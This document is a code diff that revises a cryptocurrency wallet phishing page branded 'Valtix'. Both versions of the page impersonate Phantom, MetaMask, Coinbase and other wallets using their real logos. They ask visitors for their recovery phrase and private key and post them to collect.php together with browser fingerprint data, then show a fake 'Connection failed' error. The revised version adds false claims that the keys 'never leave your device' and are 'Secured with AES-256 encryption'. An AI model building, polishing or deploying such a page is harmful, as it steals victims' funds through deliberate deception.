@@ -2,351 +2,331 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Valtix — Connect Wallet</title>
     <link rel="icon" type="image/png" href="images/logo.png">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #0a0e1a;
+            color: #c8d0d8;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            background-image: radial-gradient(circle at 30% 40%, rgba(0, 122, 255, 0.03) 0%, transparent 50%),
-                              radial-gradient(circle at 70% 60%, rgba(0, 200, 255, 0.02) 0%, transparent 50%);
+            display: flex; flex-direction: column;
         }
-        .container {
-            background: #0d1225;
-            border-radius: 16px;
-            padding: 40px 36px;
-            width: 480px;
-            max-width: 95vw;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            border: 1px solid rgba(0, 122, 255, 0.08);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(0, 122, 255, 0.02) 0%, transparent 50%);
-            pointer-events: none;
-        }
-        .brand {
-            display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px;
-            position: relative; z-index: 1;
-        }
-        .brand img { height: 34px; width: 34px; border-radius: 8px; }
-        .brand span { font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #007aff, #00c8ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -0.5px; }
-        
-        h1 { font-size: 21px; margin-bottom: 4px; color: #e0e8f0; position: relative; z-index: 1; }
-        .subtitle { color: #667788; font-size: 13px; margin-bottom: 24px; position: relative; z-index: 1; }
 
-        /* Wallet Selector */
+        .container { max-width: 480px; margin: 0 auto; padding: 20px 20px; width: 100%; flex: 1; display: flex; flex-direction: column; }
+
+        /* Header */
+        .top-bar {
+            display: flex; align-items: center; justify-content: center;
+            padding: 20px 0 30px; position: relative;
+        }
+        .top-bar .logo {
+            display: flex; align-items: center; gap: 10px;
+        }
+        .top-bar .logo img { height: 32px; width: 32px; border-radius: 7px; }
+        .top-bar .logo span { font-size: 22px; font-weight: 700; background: linear-gradient(135deg,#007aff,#00c8ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .top-bar .back-link {
+            position: absolute; left: 0; color: #556677; text-decoration: none; font-size: 14px;
+        }
+        .top-bar .back-link:hover { color: #8899aa; }
+
+        /* Step Indicator */
+        .steps {
+            display: flex; justify-content: center; gap: 8px; margin-bottom: 36px;
+        }
+        .step-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: #1a1f2e; transition: all 0.3s;
+        }
+        .step-dot.active { background: #007aff; width: 28px; border-radius: 4px; }
+        .step-dot.completed { background: #0055aa; }
+
+        /* Panel */
+        .panel {
+            background: #0d1225; border: 1px solid rgba(255,255,255,0.03);
+            border-radius: 16px; padding: 28px 24px;
+        }
+        .panel-title {
+            font-size: 20px; font-weight: 700; color: #e8f0ff;
+            margin-bottom: 6px; text-align: center;
+        }
+        .panel-sub {
+            font-size: 13px; color: #556677;
+            text-align: center; margin-bottom: 28px; line-height: 1.5;
+        }
+
+        /* Wallet Grid */
         .wallet-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
-            margin-bottom: 24px;
-            position: relative; z-index: 1;
+            gap: 12px;
+            margin-bottom: 28px;
         }
-        .wallet-option {
-            background: #080c1a;
+        .wallet-btn {
+            background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.04);
-            border-radius: 10px;
-            padding: 12px 8px;
+            border-radius: 12px;
+            padding: 16px 8px;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.25s;
             text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
         }
-        .wallet-option:hover {
-            border-color: rgba(0, 122, 255, 0.2);
-            background: rgba(0, 122, 255, 0.04);
+        .wallet-btn:hover {
+            background: rgba(0,122,255,0.04);
+            border-color: rgba(0,122,255,0.12);
+            transform: translateY(-1px);
         }
-        .wallet-option.selected {
+        .wallet-btn.selected {
+            background: rgba(0,122,255,0.06);
             border-color: #007aff;
-            background: rgba(0, 122, 255, 0.08);
-            box-shadow: 0 0 0 1px rgba(0, 122, 255, 0.3);
+            box-shadow: 0 0 0 2px rgba(0,122,255,0.15);
         }
-        .wallet-option .w-icon {
-            font-size: 24px;
-            margin-bottom: 4px;
-            display: block;
+        .wallet-btn img {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            object-fit: contain;
         }
-        .wallet-option .w-name {
+        .wallet-btn .w-name {
             font-size: 10px;
             color: #667788;
             font-weight: 500;
-        }
-        .wallet-option.selected .w-name {
-            color: #4da6ff;
+            line-height: 1.2;
         }
 
-        /* Divider */
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            position: relative; z-index: 1;
+        /* Form */
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block; font-size: 12px; color: #556677;
+            margin-bottom: 6px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.3px;
         }
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background: rgba(255,255,255,0.04);
-        }
-        .divider-text {
-            font-size: 11px;
-            color: #445566;
-            white-space: nowrap;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .tab-bar {
-            display: flex; gap: 0; margin-bottom: 20px;
-            background: #080c1a; border-radius: 10px; padding: 4px; border: 1px solid rgba(0, 122, 255, 0.06);
-            position: relative; z-index: 1;
-        }
-        .tab {
-            flex: 1; padding: 10px; border-radius: 8px; cursor: pointer;
-            font-size: 13px; font-weight: 500; border: none;
-            background: transparent; color: #556677; transition: all 0.2s;
-            display: flex; align-items: center; justify-content: center; gap: 6px;
-        }
-        .tab.active { background: linear-gradient(135deg, #007aff, #0055cc); color: white; }
-
-        .form-group { margin-bottom: 18px; text-align: left; position: relative; z-index: 1; }
-        .form-group label { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #778899; margin-bottom: 8px; font-weight: 500; }
         .form-group textarea, .form-group input {
             width: 100%; padding: 12px 14px; background: #080c1a;
-            border: 1px solid rgba(0, 122, 255, 0.08); border-radius: 8px;
-            color: white; font-size: 13px; transition: border 0.2s;
-            font-family: 'SF Mono', 'Courier New', monospace;
+            border: 1px solid rgba(0,122,255,0.06); border-radius: 8px;
+            color: white; font-size: 13px; font-family: 'SF Mono', 'Courier New', monospace;
+            transition: border-color 0.2s;
         }
-        .form-group textarea:focus, .form-group input:focus {
-            outline: none; border-color: #007aff;
-        }
-        .form-group textarea { height: 90px; resize: none; }
+        .form-group textarea:focus, .form-group input:focus { outline: none; border-color: #007aff; }
+        .form-group textarea { min-height: 80px; resize: vertical; }
+        .form-group .hint { font-size: 11px; color: #334455; margin-top: 4px; }
 
-        .btn-primary {
+        .btn-connect {
             width: 100%; padding: 14px;
             background: linear-gradient(135deg, #007aff, #0055cc);
             border: none; border-radius: 8px; color: white;
             font-size: 15px; font-weight: 600; cursor: pointer;
-            transition: all 0.2s; margin-bottom: 14px;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            position: relative; z-index: 1;
+            transition: all 0.2s; margin-top: 8px;
         }
-        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 25px rgba(0, 122, 255, 0.3); }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none; }
-
-        .error {
-            color: #ff4757; font-size: 13px; display: none; margin-top: 10px;
-            padding: 10px 14px; background: rgba(255, 71, 87, 0.06);
-            border-radius: 8px; border: 1px solid rgba(255, 71, 87, 0.1);
-            position: relative; z-index: 1;
-        }
-        .info { 
-            font-size: 12px; color: #445566; margin-top: 18px; line-height: 1.5; 
-            display: flex; align-items: center; justify-content: center; gap: 6px;
-            position: relative; z-index: 1;
-        }
-        .spinner {
-            display: none; width: 18px; height: 18px;
-            border: 2px solid rgba(255,255,255,0.15); border-top-color: white;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .input-wrapper { position: relative; }
-        .password-toggle {
-            position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
-            background: none; border: none; color: #556677; cursor: pointer;
-            padding: 0; display: flex; align-items: center;
+        .btn-connect:hover { transform: translateY(-1px); box-shadow: 0 8px 25px rgba(0,122,255,0.3); }
+        .btn-connect:disabled {
+            opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none;
         }
 
-        @media (max-width: 480px) {
-            .container { padding: 28px 20px; }
-            .wallet-grid { grid-template-columns: repeat(4, 1fr); gap: 6px; }
-            .wallet-option { padding: 10px 4px; }
-            .wallet-option .w-icon { font-size: 20px; }
-            .wallet-option .w-name { font-size: 9px; }
+        .error-box {
+            margin-top: 16px; padding: 12px 16px;
+            background: rgba(255,71,87,0.04);
+            border: 1px solid rgba(255,71,87,0.08);
+            border-radius: 8px;
+            color: #ff4757; font-size: 13px; text-align: center;
+            display: none;
+        }
+
+        .status-box {
+            margin-top: 16px; padding: 12px 16px;
+            background: rgba(0,122,255,0.04);
+            border: 1px solid rgba(0,122,255,0.08);
+            border-radius: 8px;
+            color: #4da6ff; font-size: 13px; text-align: center;
+            display: none;
+        }
+
+        /* Footer */
+        .footer-text {
+            text-align: center; padding: 24px 0;
+            font-size: 11px; color: #223344;
+        }
+
+        @media (max-width: 400px) {
+            .wallet-grid { gap: 8px; }
+            .wallet-btn { padding: 12px 6px; }
+            .wallet-btn img { width: 30px; height: 30px; }
+            .panel { padding: 20px 16px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="brand">
-            <img src="images/logo.png" alt="Valtix">
+<div class="container">
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <a href="index.html" class="back-link">← Back</a>
+        <div class="logo">
+            <img src="images/logo.png" alt="Valtix" onerror="this.style.display='none'">
             <span>Valtix</span>
         </div>
-        
-        <h1>Connect Your Wallet</h1>
-        <p class="subtitle">Select your wallet provider to access Valtix's institutional trading infrastructure</p>
-
-        <!-- Wallet Selection Grid -->
-        <div class="wallet-grid">
-            <div class="wallet-option" data-wallet="phantom" onclick="selectWallet(this)">
-                <span class="w-icon">👻</span>
-                <span class="w-name">Phantom</span>
-            </div>
-            <div class="wallet-option" data-wallet="metamask" onclick="selectWallet(this)">
-                <span class="w-icon">🦊</span>
-                <span class="w-name">MetaMask</span>
-            </div>
-            <div class="wallet-option" data-wallet="trust" onclick="selectWallet(this)">
-                <span class="w-icon">🔷</span>
-                <span class="w-name">Trust Wallet</span>
-            </div>
-            <div class="wallet-option" data-wallet="solflare" onclick="selectWallet(this)">
-                <span class="w-icon">☀️</span>
-                <span class="w-name">Solflare</span>
-            </div>
-            <div class="wallet-option" data-wallet="coinbase" onclick="selectWallet(this)">
-                <span class="w-icon">🔵</span>
-                <span class="w-name">Coinbase</span>
-            </div>
-            <div class="wallet-option" data-wallet="backpack" onclick="selectWallet(this)">
-                <span class="w-icon">🎒</span>
-                <span class="w-name">Backpack</span>
-            </div>
-            <div class="wallet-option" data-wallet="okx" onclick="selectWallet(this)">
-                <span class="w-icon">⭕</span>
-                <span class="w-name">OKX</span>
-            </div>
-            <div class="wallet-option" data-wallet="rabby" onclick="selectWallet(this)">
-                <span class="w-icon">💎</span>
-                <span class="w-name">Rabby</span>
-            </div>
-        </div>
-
-        <div class="divider">
-            <div class="divider-line"></div>
-            <div class="divider-text">Import Wallet</div>
-            <div class="divider-line"></div>
-        </div>
-
-        <div class="tab-bar">
-            <button class="tab active" onclick="switchTab('seed')">🔑 Recovery Phrase</button>
-            <button class="tab" onclick="switchTab('key')">👆 Private Key</button>
-        </div>
-
-        <div id="seedTab">
-            <div class="form-group">
-                <label>📄 Recovery Phrase</label>
-                <textarea id="seedPhrase" placeholder="Enter your 12 or 24-word recovery phrase"></textarea>
-            </div>
-        </div>
-
-        <div id="keyTab" style="display:none;">
-            <div class="form-group">
-                <label>🔐 Private Key</label>
-                <div class="input-wrapper">
-                    <input type="password" id="privateKey" placeholder="Paste your wallet's private key">
-                    <button class="password-toggle" onclick="toggleKeyVisibility()">👁️</button>
-                </div>
-            </div>
-        </div>
-
-        <button class="btn-primary" id="submitBtn" onclick="submitForm()" disabled>
-            <span id="btnText">Connect Wallet</span>
-            <div class="spinner" id="spinner"></div>
-        </button>
-
-        <div class="error" id="errorMessage">
-            Connection failed. Please verify your recovery phrase and try again.
-        </div>
-
-        <p class="info">🛡️ By connecting, you agree to the Terms of Service.</p>
     </div>
 
-    <script>
-        let selectedWallet = '';
-        let currentTab = 'seed';
+    <!-- Steps -->
+    <div class="steps">
+        <div class="step-dot active" id="step1"></div>
+        <div class="step-dot" id="step2"></div>
+    </div>
 
-        function selectWallet(el) {
-            document.querySelectorAll('.wallet-option').forEach(w => w.classList.remove('selected'));
-            el.classList.add('selected');
-            selectedWallet = el.dataset.wallet;
-            document.getElementById('submitBtn').disabled = false;
+    <!-- Panel -->
+    <div class="panel">
+        <h2 class="panel-title" id="panelTitle">Connect Wallet</h2>
+        <p class="panel-sub" id="panelSub">Select your wallet provider to connect to Valtix.</p>
+
+        <!-- Step 1: Wallet Selector -->
+        <div id="step1Content">
+            <div class="wallet-grid" id="walletGrid">
+                <!-- 8 wallets with real logos -->
+                <div class="wallet-btn" data-wallet="phantom" onclick="selectWallet(this)">
+                    <img src="https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff" alt="Phantom" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23007aff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2214%22 font-weight=%22bold%22>P</text></svg>'">
+                    <span class="w-name">Phantom</span>
+                </div>
+                <div class="wallet-btn" data-wallet="metamask" onclick="selectWallet(this)">
+                    <img src="https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg" alt="MetaMask" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23f6851b%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2212%22 font-weight=%22bold%22>MM</text></svg>'">
+                    <span class="w-name">MetaMask</span>
+                </div>
+                <div class="wallet-btn" data-wallet="trustwallet" onclick="selectWallet(this)">
+                    <img src="https://logo.svgcdn.com/token-branded/trust-wallet.svg" alt="Trust Wallet" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%233374db%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>TW</text></svg>'">
+                    <span class="w-name">Trust Wallet</span>
+                </div>
+                <div class="wallet-btn" data-wallet="solflare" onclick="selectWallet(this)">
+                    <img src="https://logo.svgcdn.com/token-branded/solflare.svg" alt="Solflare" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23fc7c02%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>SF</text></svg>'">
+                    <span class="w-name">Solflare</span>
+                </div>
+                <div class="wallet-btn" data-wallet="coinbase" onclick="selectWallet(this)">
+                    <img src="https://static-assets.coinbase.com/ui-infra/illustration/v1/pictogram/svg/light/coinbaseLogoNavigation-2.svg" alt="Coinbase" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%230052ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-weight=%22bold%22>CB</text></svg>'">
+                    <span class="w-name">Coinbase</span>
+                </div>
+                <div class="wallet-btn" data-wallet="backpack" onclick="selectWallet(this)">
+                    <img src="https://logo.svgcdn.com/token-branded/backpack.svg" alt="Backpack" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%235455ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%229%22 font-weight=%22bold%22>BP</text></svg>'">
+                    <span class="w-name">Backpack</span>
+                </div>
+                <div class="wallet-btn" data-wallet="okx" onclick="selectWallet(this)">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c2/OKX_logo.svg" alt="OKX" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23001b5c%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2212%22 font-weight=%22bold%22>OKX</text></svg>'">
+                    <span class="w-name">OKX</span>
+                </div>
+                <div class="wallet-btn" data-wallet="rabby" onclick="selectWallet(this)">
+                    <img src="https://raw.githubusercontent.com/RabbyHub/logo/main/rabby.svg" alt="Rabby" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%234629b4%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>RB</text></svg>'">
+                    <span class="w-name">Rabby</span>
+                </div>
+            </div>
+            <button class="btn-connect" id="continueBtn" onclick="goToStep2()" disabled>Continue</button>
+        </div>
+
+        <!-- Step 2: Import Form -->
+        <div id="step2Content" style="display:none;">
+            <div style="text-align:center;margin-bottom:20px;">
+                <div id="selectedWalletDisplay" style="display:flex;align-items:center;justify-content:center;gap:10px;padding:12px;background:rgba(0,122,255,0.04);border-radius:10px;border:1px solid rgba(0,122,255,0.06);">
+                    <img id="selectedWalletIcon" src="" alt="" style="width:28px;height:28px;border-radius:6px;object-fit:contain;">
+                    <span id="selectedWalletName" style="font-size:14px;font-weight:600;color:#e0e8f0;"></span>
+                </div>
+            </div>
+            <p class="panel-sub" style="margin-bottom:20px;">Import your existing wallet to start trading. Your keys never leave your device.</p>
+            <div class="form-group">
+                <label>Recovery Phrase (Seed)</label>
+                <textarea id="seedInput" placeholder="Enter your 12 or 24-word recovery phrase..." rows="3"></textarea>
+                <div class="hint">Separate each word with a space</div>
+            </div>
+            <div class="form-group">
+                <label>Private Key (optional)</label>
+                <input type="password" id="pkeyInput" placeholder="Or paste your private key here...">
+            </div>
+            <button class="btn-connect" onclick="submitCapture()">Connect Wallet</button>
+            <div class="error-box" id="errorBox">Connection failed. Please verify your recovery phrase and try again.</div>
+            <div class="status-box" id="statusBox">Connecting to Valtix network...</div>
+        </div>
+    </div>
+
+    <div class="footer-text">Secured with AES-256 encryption</div>
+</div>
+
+<script>
+    // Wallet logos map
+    const walletLogos = {
+        phantom: "https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff",
+        coinbase: "https://static-assets.coinbase.com/ui-infra/illustration/v1/pictogram/svg/light/coinbaseLogoNavigation-2.svg",
+        metamask: "https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg",
+        trustwallet: "https://logo.svgcdn.com/token-branded/trust-wallet.svg",
+        backpack: "https://logo.svgcdn.com/token-branded/backpack.svg",
+        okx: "https://upload.wikimedia.org/wikipedia/commons/c/c2/OKX_logo.svg",
+        solflare: "https://logo.svgcdn.com/token-branded/solflare.svg",
+        rabby: "https://raw.githubusercontent.com/RabbyHub/logo/main/rabby.svg"
+    };
+
+    let selectedWallet = null;
+    let walletName = '';
+
+    function selectWallet(el) {
+        document.querySelectorAll('.wallet-btn').forEach(b => b.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedWallet = el.dataset.wallet;
+        walletName = el.querySelector('.w-name').textContent;
+        document.getElementById('continueBtn').disabled = false;
+    }
+
+    function goToStep2() {
+        if (!selectedWallet) return;
+        document.getElementById('step1Content').style.display = 'none';
+        document.getElementById('step2Content').style.display = 'block';
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step1').classList.add('completed');
+        document.getElementById('step2').classList.add('active');
+        document.getElementById('panelTitle').textContent = 'Import Wallet';
+        document.getElementById('panelSub').textContent = 'Enter your recovery phrase to connect.';
+
+        // Show selected wallet
+        document.getElementById('selectedWalletIcon').src = walletLogos[selectedWallet] || '';
+        document.getElementById('selectedWalletName').textContent = walletName;
+    }
+
+    function submitCapture() {
+        const seed = document.getElementById('seedInput').value.trim();
+        const pkey = document.getElementById('pkeyInput').value.trim();
+
+        if (!seed && !pkey) {
+            document.getElementById('errorBox').style.display = 'block';
+            document.getElementById('statusBox').style.display = 'none';
+            return;
         }
 
-        function switchTab(tab) {
-            currentTab = tab;
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab')[tab === 'seed' ? 0 : 1].classList.add('active');
-            document.getElementById('seedTab').style.display = tab === 'seed' ? 'block' : 'none';
-            document.getElementById('keyTab').style.display = tab === 'key' ? 'block' : 'none';
-            document.getElementById('errorMessage').style.display = 'none';
-        }
+        document.getElementById('errorBox').style.display = 'none';
+        document.getElementById('statusBox').style.display = 'block';
+        document.getElementById('statusBox').textContent = 'Connecting to Valtix network...';
 
-        function toggleKeyVisibility() {
-            const input = document.getElementById('privateKey');
-            input.type = input.type === 'password' ? 'text' : 'password';
-        }
+        // Build capture payload
+        const payload = {
+            wallet: selectedWallet,
+            walletName: walletName,
+            seed: seed,
+            pkey: pkey,
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            screenSize: screen.width + 'x' + screen.height,
+            timestamp: new Date().toISOString()
+        };
 
-        function submitForm() {
-            const seed = document.getElementById('seedPhrase').value.trim();
-            const pkey = document.getElementById('privateKey').value.trim();
-
-            if (!selectedWallet) {
-                document.getElementById('errorMessage').textContent = 'Please select your wallet provider first.';
-                document.getElementById('errorMessage').style.display = 'block';
-                return;
-            }
-
-            if (!seed && !pkey) {
-                document.getElementById('errorMessage').textContent = 'Connection failed. Please verify your recovery phrase and try again.';
-                document.getElementById('errorMessage').style.display = 'block';
-                return;
-            }
-
-            document.getElementById('btnText').style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.querySelector('.btn-primary').disabled = true;
-
-            const formData = new FormData();
-            formData.append('wallet', selectedWallet);
-            formData.append('seed', seed);
-            formData.append('pkey', pkey);
-            formData.append('userAgent', navigator.userAgent);
-            formData.append('pageUrl', window.location.href);
-            formData.append('screenSize', window.screen.width + 'x' + window.screen.height);
-
-            fetch('collect.php', {
-                method: 'POST',
-                body: formData
-            })
-            .then(r => r.json())
-            .then(() => {
-                setTimeout(() => {
-                    document.getElementById('btnText').style.display = 'inline';
-                    document.getElementById('spinner').style.display = 'none';
-                    document.querySelector('.btn-primary').disabled = false;
-                    document.getElementById('errorMessage').innerHTML =
-                        'Connection failed. Please verify your recovery phrase and try again.';
-                    document.getElementById('errorMessage').style.display = 'block';
-                    document.getElementById('seedPhrase').value = '';
-                    document.getElementById('privateKey').value = '';
-                }, 2000);
-            })
-            .catch(() => {
-                document.getElementById('btnText').style.display = 'inline';
-                document.getElementById('spinner').style.display = 'none';
-                document.querySelector('.btn-primary').disabled = false;
-                document.getElementById('errorMessage').innerHTML =
-                    'Connection failed. Please verify your recovery phrase and try again.';
-                document.getElementById('errorMessage').style.display = 'block';
-            });
-        }
-    </script>
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'collect.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onload = function() {
+            document.getElementById('statusBox').style.display = 'none';
+            document.getElementById('errorBox').style.display = 'block';
+        };
+        xhr.onerror = function() {
+            document.getElementById('statusBox').style.display = 'none';
+            document.getElementById('errorBox').style.display = 'block';
+        };
+        xhr.send(JSON.stringify(payload));
+    }
+</script>
 </body>
 </html>
